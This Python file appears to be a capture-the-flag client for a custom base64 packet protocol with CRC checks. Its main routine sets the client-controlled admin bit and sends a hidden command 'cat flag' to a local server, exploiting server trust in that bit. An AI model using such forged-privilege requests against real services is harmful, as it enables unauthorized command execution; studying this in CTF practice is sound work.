from enum import Enum
import datetime
import base64
import socket
import subprocess
import binascii
import sys
from pwn import *

#context.log_level="debug"
ContentsLength = 511

if len(sys.argv) == 2:
    debug = True
else:
    debug = False


class Rule(Enum):
   #Total = 1032 # byte ( header 6byte + contents 1024byte + crc 4byte)
    # total 48 bit = 6 byte
   Delimiter=(47,1) #1
   Admin=(46,1) #1
   Date=(13,8589934591) #33
   Cmd=(10,7) #3
   Ans=(9,1) # 1
   ContentLength=(0,ContentsLength) #9

   def __init__(self,pos,digit):
        self.pos = pos
        self.digit = digit

class Cmd(Enum):
    Admin=0 
    Select=1 
    Create=2 
    Show=3 
    Write=4 
    Delete=5
    Get=6
    Hidden=7

########################################################################################################################

class Packet():
    def __init__(self):
        self.reset()

    def reset(self):
        self.header = 0
        self.ans = 0
        self.admin = 0
        self.date = 0
        self.cmd = 0
        self.content_length = 0
        self.content = ""
        self.base_content = ""
        self.crcTarget = ""
        self.crc = 0


    def parse(self,raw):
        '''
        parse the raw data(bytes) which is excanged between server and client
        save informations to field of Packet Class
            args:
                raw (bytes) : raw data exchanged between server and client
            Returns:
                None
        '''
        try:
            self.header = int(raw[0:15])            # exception will raise automatically
            self.content_length = int(self.header&Rule.ContentLength.digit) # base64 contents length  =  len(base64encodeing(contents))
            self.base_content = raw[15:15+self.content_length] # base64 content

            self.cmd = int((self.header>>Rule.Cmd.pos)&Rule.Cmd.digit) # command : 0 ~ 7
            self.ans = int((self.header>>Rule.Ans.pos)&Rule.Ans.digit) # answer : True or False
            self.date = int((self.header>>Rule.Date.pos)&Rule.Date.digit) # date 
            self.admin = int((self.header>>Rule.Admin.pos)&Rule.Admin.digit) # admin bit -> 1: admin , 0: user
            
            self.content = base64.b64decode(raw[15:15+self.content_length]).decode() # decoded content 
            self.crcTarget = raw[0:15+self.content_length] # crc target 
            self.crc = int(raw[15+self.content_length:].decode("utf-8")) # crc 

            now = datetime.datetime.now()
            server_date = int(datetime.datetime.timestamp(now))

            print(f'received data is {self.content}')

            # date is be between 0 and 60
            if server_date - self.date < 0 or abs(server_date-self.date) > 60:
                raise Exception("invalid date")

        # crc , convert header data type str to etc...
        except Exception as e:
            raise Exception(f"{e}")

        if debug:
            print("parse debug -----------------------------------------------")
            print("ans1 : "+str(self.ans))
            print("admin : "+str(self.admin))
            print("date : "+ str(datetime.datetime.fromtimestamp(self.date)))
            print("cmd : "+str(self.cmd))
            print("content_length : "+str(self.content_length))
            print("data : " + self.content)   
            print("basedata : " + self.base_content.decode()) 
            print("crc : " + str(self.crc))
            print("parse debug -----------------------------------------------")
              

    def assemble(self,ans,admin,cmd,content_length,content):
        '''
        assemble data 
            args: 
                ans : answer from server, not use in client
                admin : check whether this packet is admin or not. 
                cmd : command
                content_length : actually not using, 
                content : content 
            return:
                raw (bytes) : assebled raw data 
        '''
        now = datetime.datetime.now()
        date = int(datetime.datetime.timestamp(now))

        raw = (1<<Rule.Delimiter.pos)
        raw |= (self.admin<<Rule.Admin.pos)
        raw |= (date<<Rule.Date.pos)
        raw |= (cmd<<Rule.Cmd.pos)
        raw |= (ans<<Rule.Ans.pos)
        
        if len(content) > 0 and content[-1] == "\n":
            content = content.replace("\n","")
        
        
        contents = base64.b64encode(content.encode('utf-8'))

        content_length = len(contents)
        if content_length > 511:
            raise Exception("too many contents to transfer..")
        raw |= (content_length<<Rule.ContentLength.pos)
        raw = str(raw).encode()+contents
        crc = binascii.crc32(raw)
        raw = raw.decode("utf-8") + str(crc)

        return raw

##################################################################################################################33


class Protocol:

    def __init__(self,host,port):
        self.dbname=""
        self.DB=dict()
        self.selected = 0
        self.p = Packet()
        self.host = host
        self.port = port

    def run(self):
        self.sock = remote(self.host,self.port)
        self.interaction_server()

    def get_info(self,what):
        return self.sendPacket(Cmd.Get.value,what)

    def interaction_server(self):
        self.p.admin = 1
        result = self.sendPacket(Cmd.Hidden.value,"cat flag")
        exit()


        result = self.sendPacket(Cmd.Admin.value,"admin")
        if result == True:
            self.p.admin = 1
        self.dprint(f'\n[+] check admin result is {result}')

        while True:
            _input = 0
            try:
                result = self.sendPacket(6,"Selected")
                if self.p.content == "":
                    cate = "NOPE"
                else:
                    cate = self.p.content
                self.dprint(f'[+] Current Category is {cate}')
                _input = int(input("1)Select 2)Create 3)Showing 4)Write 5)Delete 7)Hidden 9)Exit 0)Admin\n : "))
            except Exception as e:
                self.dprint(e)
                continue
            command = ""

            ## Admin 
            if _input == Cmd.Admin.value:
                self.dprint(f'send for checking I am admin')
                result = self.sendPacket(_input,"turnon!")
                if result:
                    self.dprint("\n[+] set a admin bit")
                    self.p.admin = 1

            ## Select
            elif _input == Cmd.Select.value:
                result = self.get_info("Category")
                if result == 0:
                    self.dprint(f'\n[+] There is no Categories for selecting')
                    continue
                else :
                    self.dprint(f'\n[+] List\n{self.p.content}')
                    command = input("[Select] input category for selecting : ")
                    result = self.sendPacket(_input,command)
                    if result == 0:
                        self.dprint(f'\n[+] Fail - {self.p.content}')
                    else:
                        self.dprint(f'\n[+] Success - {self.p.content}')


            ## Create
            elif _input == Cmd.Create.value:
                result = self.get_info("Category")
                if result == 0:
                    self.dprint(f'\n[+] Empty Categories')
                else:
                    self.dprint(f'\n[+] List\n{self.p.content}')
                command = input("[Create] input category for creating : ")
                result = self.sendPacket(_input,command)
                if result == 0:
                    self.dprint(f'\n[+] Fail - {self.p.content}')
                else:
                    self.dprint(f'\n[+] Success - {self.p.content}')

            ## Show
            elif _input == Cmd.Show.value:
                command = self.dbname
                result = self.sendPacket(_input,command)
                if result == 0:
                    self.dprint(f'\n[+] Fail - {self.p.content}')
                else:
                    self.dprint(f'\n[+] Contents\n{self.p.content}')
                
            ## Write
            elif _input == Cmd.Write.value:
                command = input("[Write] input contents for Writing : ")
                result = self.sendPacket(_input,command)
                if result == 0:
                    self.dprint(f'\n[+] Fail - {self.p.content}')
                else :
                    self.dprint(f'\n[+] Success')
                    result = self.sendPacket(Cmd.Show.value,self.dbname)
                    self.dprint(f'\n[+] Contents\n{self.p.content}')

            ## Delete
            elif _input == Cmd.Delete.value:
                result = self.get_info("Contents")
                if result == 0:
                    self.dprint(f'\n[+] Fail - {self.p.content}')
                else :
                    self.dprint(f'\n[+] contensts')
                    contents = self.p.content.split("\n")
                    index = 0
                    for c in contents:
                        if c == "":
                            continue
                        self.dprint(f'  {index}. {c}')
                        index = index + 1

                    command = input("[Delete] Which row are you going to delete : ")
                    result = self.sendPacket(_input,command)
                    if result == 0:
                        self.dprint(f'\n[+] Fail - {self.p.content}')
                    else:
                        self.dprint(f'\n[+] Success')
                        result = self.sendPacket(Cmd.Show.value,self.dbname)
                        self.dprint(f'\n[+] Contents\n{self.p.content}')
                        
                    

            ## Hideen
            elif _input == Cmd.Hidden.value:
                command = input("")
                result = self.sendPacket(_input,command)
                self.dprint(f'\n[+]{self.p.content}')
                
                    

            ## exit
            elif _input == 9:
                self.dprint("exit")
                return
            else :
                self.dprint("error")
    

    def dprint(self,str):
        if debug:
            print(str)

    ## server -> client 
    def just_send(self,ans,content):
        try:
            data = self.p.assemble(ans,self.p.admin,self.p.cmd,len(content),content)
        except Exception as e:
            data = self.p.assemble(ans,self.p.admin,self.p.cmd,len("too many contents to transfer.."),"too many contents to transfer..")

        print(data,end="\n",flush=True)


    ## client -> server ( and wait for recving response )
    def sendPacket(self,cmd,content):
        data = self.p.assemble(0,self.p.admin,cmd,len(content),content)
        self.sock.sendline(data.encode("utf-8"))
        result = self.sock.recvline()
        self.dprint(result)

        p_ret = self.p.parse(result)
        if "[Exception]" == p_ret:
            self.dprint(self.p.content)
            raise Exception(self.p.content)

        ret = self.crc_check(result) 
    
        if ret == False:
            self.dprint("CRC check failed")
        else:
            self.dprint("CRC check success")
        self.dprint("--------------------------------")

        if self.p.ans == 0:
            return False
        else:
            return True

    def crc_check(self,d):
        if debug:
            self.dprint("---------- CRC check ----------")
            self.dprint(f'raw data : {d}')
            self.dprint(f'data : {self.p.base_content}')
            self.dprint(f'crc : {self.p.crc}')
        if len(d) <= 4:
            return False
        gc = binascii.crc32(self.p.crcTarget)
        #print(gc)

        if gc == self.p.crc:
            self.dprint("su")
            return True
        else :
            self.dprint("fa")
            return False

client = Protocol("127.0.0.1",35339)
client.run()
